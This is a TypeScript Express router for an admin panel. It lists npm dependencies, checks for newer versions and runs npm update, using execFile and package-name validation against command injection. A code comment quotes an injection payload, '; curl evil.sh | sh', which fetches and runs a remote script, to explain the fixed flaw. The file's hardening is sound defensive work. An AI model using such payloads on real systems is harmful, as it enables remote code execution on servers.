import { Router, Response, NextFunction } from 'express';
import { authenticate, AuthRequest } from '../middleware/auth';
import { authorize, requirePermission } from '../middleware/authorize';
import { execFile } from 'child_process';
import { promisify } from 'util';
import * as fs from 'fs/promises';
import * as path from 'path';
import logger from '../../utils/logger';
import { getErrorMessage, errorProps } from '../../utils/errors';

/**
 * `execFile`, never `exec`.
 *
 * `exec` runs its argument through a shell, and this route built that argument
 * by interpolating a client-supplied package list. A package named
 * `; curl evil.sh | sh` was therefore executed as the server user — confirmed
 * remote code execution behind the admin role. `execFile` takes an argv array
 * and spawns the binary directly, so no metacharacter in an argument can ever
 * be read as syntax.
 */
const execFileAsync = promisify(execFile);

/**
 * npm's package-name grammar, near enough: optional `@scope/`, then lowercase
 * letters, digits, and `.-_`.
 *
 * Belt and braces alongside `execFile` — nothing here can escape an argv array
 * anyway, but a name that does not look like a package should not reach npm at
 * all, and a leading `-` would be read as a flag rather than a package.
 */
const PACKAGE_NAME = /^(@[a-z0-9][a-z0-9._-]*\/)?[a-z0-9][a-z0-9._-]*$/;
/** A dependency discovered by parsing a package.json in this repo. */
interface ComponentInfo {
  name: string;
  currentVersion: string;
  type: 'frontend' | 'backend';
  category: string;
}

/** A dependency that has a newer version available on the registry. */
interface ComponentUpdate extends ComponentInfo {
  latestVersion: string;
}

const router = Router();

// All component management routes require admin authentication
router.use(authenticate);

/**
 * GET /api/admin/components
 * Get list of all dependencies with current versions
 */
router.get('/', requirePermission('settings', 'read'), async (req: AuthRequest, res: Response, next: NextFunction) => {
  try {
    // Check if user is admin
    if (!req.user) {
      return res.status(401).json({ success: false, error: 'Unauthorized' });
    }

    const adapter = (await import('../../services/database')).default.getAdapter();
    const user = await adapter.getUserByEmail(req.user.email);
    if (!user || !(user as { roles?: Array<{ systemRole?: string }> }).roles?.some((r) => r.systemRole === 'admin')) {
      return res.status(403).json({ success: false, error: 'Admin access required' });
    }

    // Read package.json files
    // In Docker: backend is in /app, frontend package.json is in /app/../package.json
    // In development: backend is in ./backend, frontend package.json is in ./package.json
    const backendDir = process.cwd(); // Current working directory (backend folder)
    const rootDir = path.resolve(backendDir, '..'); // Parent directory (project root)
    const rootPackagePath = path.join(rootDir, 'package.json');
    const backendPackagePath = path.join(backendDir, 'package.json');

    const [rootPackage, backendPackage] = await Promise.all([
      fs.readFile(rootPackagePath, 'utf-8').catch(() => null),
      fs.readFile(backendPackagePath, 'utf-8').catch(() => null),
    ]);

    const components: ComponentInfo[] = [];

    // Parse frontend dependencies
    if (rootPackage) {
      try {
        const pkg = JSON.parse(rootPackage);
        const deps = { ...pkg.dependencies, ...pkg.devDependencies };
        Object.entries(deps).forEach(([name, version]) => {
          components.push({
            name,
            currentVersion: version as string,
            type: 'frontend',
            category: pkg.dependencies[name] ? 'dependency' : 'devDependency',
          });
        });
      } catch (error) {
        logger.error('Error parsing frontend package.json:', error);
      }
    }

    // Parse backend dependencies
    if (backendPackage) {
      try {
        const pkg = JSON.parse(backendPackage);
        const deps = { ...pkg.dependencies, ...pkg.devDependencies };
        Object.entries(deps).forEach(([name, version]) => {
          // Avoid duplicates
          if (!components.find(c => c.name === name && c.type === 'backend')) {
            components.push({
              name,
              currentVersion: version as string,
              type: 'backend',
              category: pkg.dependencies[name] ? 'dependency' : 'devDependency',
            });
          }
        });
      } catch (error) {
        logger.error('Error parsing backend package.json:', error);
      }
    }

    res.json({
      success: true,
      data: components.sort((a, b) => a.name.localeCompare(b.name)),
    });
  } catch (error) {
    logger.error('Error getting components:', error);
    next(error);
  }
});

/**
 * GET /api/admin/components/updates
 * Check for available updates for all packages
 */
router.get('/updates', requirePermission('settings', 'read'), async (req: AuthRequest, res: Response, next: NextFunction) => {
  try {
    // Check admin access
    if (!req.user) {
      return res.status(401).json({ success: false, error: 'Unauthorized' });
    }

    const adapter = (await import('../../services/database')).default.getAdapter();
    const user = await adapter.getUserByEmail(req.user.email);
    if (!user || !(user as { roles?: Array<{ systemRole?: string }> }).roles?.some((r) => r.systemRole === 'admin')) {
      return res.status(403).json({ success: false, error: 'Admin access required' });
    }

    // Get current components by reading package.json files directly
    const backendDir = process.cwd();
    const rootDir = path.resolve(backendDir, '..');
    const rootPackagePath = path.join(rootDir, 'package.json');
    const backendPackagePath = path.join(backendDir, 'package.json');

    const [rootPackage, backendPackage] = await Promise.all([
      fs.readFile(rootPackagePath, 'utf-8').catch(() => null),
      fs.readFile(backendPackagePath, 'utf-8').catch(() => null),
    ]);

    const components: ComponentInfo[] = [];

    // Parse frontend dependencies
    if (rootPackage) {
      try {
        const pkg = JSON.parse(rootPackage);
        const deps = { ...pkg.dependencies, ...pkg.devDependencies };
        Object.entries(deps).forEach(([name, version]) => {
          components.push({
            name,
            currentVersion: version as string,
            type: 'frontend',
            category: pkg.dependencies[name] ? 'dependency' : 'devDependency',
          });
        });
      } catch (error) {
        logger.error('Error parsing frontend package.json:', error);
      }
    }

    // Parse backend dependencies
    if (backendPackage) {
      try {
        const pkg = JSON.parse(backendPackage);
        const deps = { ...pkg.dependencies, ...pkg.devDependencies };
        Object.entries(deps).forEach(([name, version]) => {
          if (!components.find(c => c.name === name && c.type === 'backend')) {
            components.push({
              name,
              currentVersion: version as string,
              type: 'backend',
              category: pkg.dependencies[name] ? 'dependency' : 'devDependency',
            });
          }
        });
      } catch (error) {
        logger.error('Error parsing backend package.json:', error);
      }
    }
    const updates: ComponentUpdate[] = [];

    // Check each package for updates (limited to avoid timeout)
    for (const component of components.slice(0, 50)) { // Limit to 50 to avoid timeout
      try {
        // The name comes from a parsed package.json rather than a request, but
        // it is still not this route's to trust.
        if (!PACKAGE_NAME.test(component.name)) continue;
        const { stdout } = await execFileAsync('npm', ['view', component.name, 'version'], {
          timeout: 5000,
        });
        const latestVersion = stdout.trim();
        const currentVersion = component.currentVersion.replace(/[\^~]/, '');

        if (latestVersion !== currentVersion) {
          updates.push({
            name: component.name,
            currentVersion: currentVersion,
            latestVersion: latestVersion,
            type: component.type,
            category: component.category,
          });
        }
      } catch (error) {
        // Package might not exist or network error - skip
        logger.debug(`Could not check updates for ${component.name}:`, error);
      }
    }

    res.json({
      success: true,
      data: updates,
    });
  } catch (error) {
    logger.error('Error checking for updates:', error);
    next(error);
  }
});

/**
 * POST /api/admin/components/update
 * Update one or more packages
 */
router.post('/update', authorize(['admin']), async (req: AuthRequest, res: Response, _next: NextFunction) => {
  try {
    // Check admin access
    if (!req.user) {
      return res.status(401).json({ success: false, error: 'Unauthorized' });
    }

    const adapter = (await import('../../services/database')).default.getAdapter();
    const user = await adapter.getUserByEmail(req.user.email);
    if (!user || !(user as { roles?: Array<{ systemRole?: string }> }).roles?.some((r) => r.systemRole === 'admin')) {
      return res.status(403).json({ success: false, error: 'Admin access required' });
    }

    const { packages, type } = req.body;

    if (!packages || !Array.isArray(packages) || packages.length === 0) {
      return res.status(400).json({ success: false, error: 'Packages array is required' });
    }

    if (!type || !['frontend', 'backend'].includes(type)) {
      return res.status(400).json({ success: false, error: 'Type must be "frontend" or "backend"' });
    }

    // Determine working directory
    const backendDir = process.cwd();
    const rootDir = path.resolve(backendDir, '..');
    const workDir = type === 'frontend' ? rootDir : backendDir;

    // Only the names that are strings are echoed back. Interpolating the raw
    // entries would itself throw on something like `{ toString: 'nope' }`, where
    // the property shadows the method and is not callable - turning a rejected
    // request into a 500 in the code that exists to reject it.
    const invalid = packages.filter(
      (name: unknown) => typeof name !== 'string' || !PACKAGE_NAME.test(name)
    );
    if (invalid.length > 0) {
      const named = invalid.filter((name: unknown): name is string => typeof name === 'string');
      return res.status(400).json({
        success: false,
        error: named.length > 0 ? `Not valid package names: ${named.join(', ')}` : 'Not valid package names',
      });
    }

    logger.info(`Updating packages: ${packages.join(', ')} in ${type}`);

    const { stdout, stderr } = await execFileAsync('npm', ['update', ...packages], {
      cwd: workDir,
      timeout: 300000, // 5 minutes timeout
    });

    // Log the update
    logger.info(`Package update completed for ${type}:`, { packages, stdout, stderr });

    res.json({
      success: true,
      message: `Successfully updated ${packages.length} package(s)`,
      data: {
        packages,
        type,
        output: stdout,
        errors: stderr || null,
      },
    });
  } catch (error: unknown) {
    logger.error('Error updating packages:', error);
    res.status(500).json({
      success: false,
      error: getErrorMessage(error) || 'Failed to update packages',
      details: errorProps(error).stdout || errorProps(error).stderr,
    });
  }
});

/**
 * POST /api/admin/components/update-all
 * Update all packages to latest versions
 */
router.post('/update-all', authorize(['admin']), async (req: AuthRequest, res: Response, _next: NextFunction) => {
  try {
    // Check admin access
    if (!req.user) {
      return res.status(401).json({ success: false, error: 'Unauthorized' });
    }

    const adapter = (await import('../../services/database')).default.getAdapter();
    const user = await adapter.getUserByEmail(req.user.email);
    if (!user || !(user as { roles?: Array<{ systemRole?: string }> }).roles?.some((r) => r.systemRole === 'admin')) {
      return res.status(403).json({ success: false, error: 'Admin access required' });
    }

    const { type } = req.body;

    if (!type || !['frontend', 'backend'].includes(type)) {
      return res.status(400).json({ success: false, error: 'Type must be "frontend" or "backend"' });
    }

    // Determine working directory
    const backendDir = process.cwd();
    const rootDir = path.resolve(backendDir, '..');
    const workDir = type === 'frontend' ? rootDir : backendDir;

    // Update all packages


    logger.info(`Updating all packages in ${type}`);

    // Execute update
    const { stdout, stderr } = await execFileAsync('npm', ['update'], {
      cwd: workDir,
      timeout: 600000, // 10 minutes timeout
    });

    // Log the update
    logger.info(`All packages updated for ${type}:`, { stdout, stderr });

    res.json({
      success: true,
      message: 'Successfully updated all packages',
      data: {
        type,
        output: stdout,
        errors: stderr || null,
      },
    });
  } catch (error: unknown) {
    logger.error('Error updating all packages:', error);
    res.status(500).json({
      success: false,
      error: getErrorMessage(error) || 'Failed to update all packages',
      details: errorProps(error).stdout || errorProps(error).stderr,
    });
  }
});

export default router;

